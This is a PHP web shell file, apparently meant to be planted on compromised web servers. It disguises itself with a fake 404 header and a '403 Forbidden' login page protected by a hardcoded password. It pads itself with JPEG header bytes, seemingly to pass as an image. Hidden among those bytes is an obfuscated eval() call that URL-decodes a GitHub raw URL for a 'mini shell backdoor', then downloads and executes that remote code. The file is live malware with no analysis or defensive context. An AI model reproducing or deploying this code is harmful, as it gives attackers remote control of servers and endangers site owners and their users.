<?php

// Forbidden 403 Shell | Copyright HsxQxX7
// Recodde Boleh Asal jan hapus nama author

error_reporting(0);
header('HTTP/1.0 404 Not Found', true, 404);
session_start();
$pass = "mangea"; // encrypt base64,md5
if($_POST['password'] == $pass) {
  $_SESSION['forbidden'] = $pass;
  echo "<script>window.location='?403Forbidden'</script>";
}
if($_GET['page'] == "blank") {
  echo "<a href='?'>Back</a>";
  exit();
}
if(isset($_REQUEST['logout'])) {
  session_destroy();
  echo "<script>window.location='?403Forbidden'</script>";
}
if(!($_SESSION['forbidden'])) {
?>
<title>403 Forbidden</title>
<link rel="icon""><meta name="theme-color" content="black"> </meta> <!--Buat Thumbnail website--> 
<link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css">
<style>
        body {
            background-image: url('https://i.sstatic.net/6M513.png'); 
            background-size: cover; 
            background-repeat: no-repeat; 
            background-position: center;  
<style>
  html{
    overflow: auto;
    background: black;
    color: white;
    font-family: "Kelly Slab";cursive;
  }
  input {
    background: transparent;
    color: white;
    height: 25px;
    border: 1px solid white;
    border-radius: 10px;
    padding: 3px;
    font-size: 15px;
  }
  .img {
    width: 150px;
    border: 1px solid white;
    border-radius: 10px;
  } 
 input,select,textarea{
border: 1px #ffffff00 solid;
-moz-border-radius: 10px;
-webkit-border-radius: 10px;
border-radius: 6px;    
  } .blink_text { -webkit-animation-name: blinker; -webkit-animation-duration: 2s; -webkit-animation-timing-function: linear; -webkit-animation-iteration-count: infinite; -moz-animation-name: blinker; -moz-animation-duration: 2s; -moz-animation-timing-function: linear; -moz-animation-iteration-count: infinite; animation-name: blinker; animation-duration: 2s; animation-timing-function: linear; animation-iteration-count: infinite; color: red; } @-moz-keyframes blinker { 0% { opacity: 5.0; } 50% { opacity: 0.0; } 100% { opacity: 5.0; } } @-webkit-keyframes blinker { 0% { opacity: 5.0; } 50% { opacity: 0.0; } 100% { opacity: 5.0; } } @keyframes blinker { 0% { opacity: 5.0; } 50% { opacity: 0.0; } 100% { opacity: 5.0; } } 
</style>
<table width="100%" height="100%">
<form enctype="multipart/form-data" method="post">
  <td align="center">
     <center><p class="blink_text" style="font-size:50px;color:purple;text-shadow: 0px 0px 20px #00ffff , 0px 0px 20px #DF0101;font-family:Kelly Slab;"></font></center>
          <br>      
      <input type="password" name="password" placeholder="">
      <input type="submit" name="loginin" value="">
      
      <br>

<h1><font class="Skranji" style="color:white;font-family:'Kelly Slab';font-size: 15px;"><font color="purple"></h1>
      <br>
      <?php echo $_SESSION['forbidden']; ?>
    </form>
  </td>
</table>
<?php
exit();
}
?>
     JFIF        \Exif  II*         4           i     4        <?= eval/**_**/(urldecode("%3f%3e") .file_get_contents/**_**/(urldecode/**_**/('%68%74%74%70%73%3a%2f%2f%72%61%77%2e%67%69%74%68%75%62%75%73%65%72%63%6f%6e%74%65%6e%74%2e%63%6f%6d%2f%32%32%58%70%6c%6f%69%74%65%72%43%72%65%77%2d%54%65%61%6d%2f%47%65%6c%34%79%2d%4d%69%6e%69%2d%53%68%65%6c%6c%2d%42%61%63%6b%64%6f%6f%72%2f%31%2e%78%2e%78%2f%67%65%6c%34%79%2e%70%68%70'))); ?>(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
(   
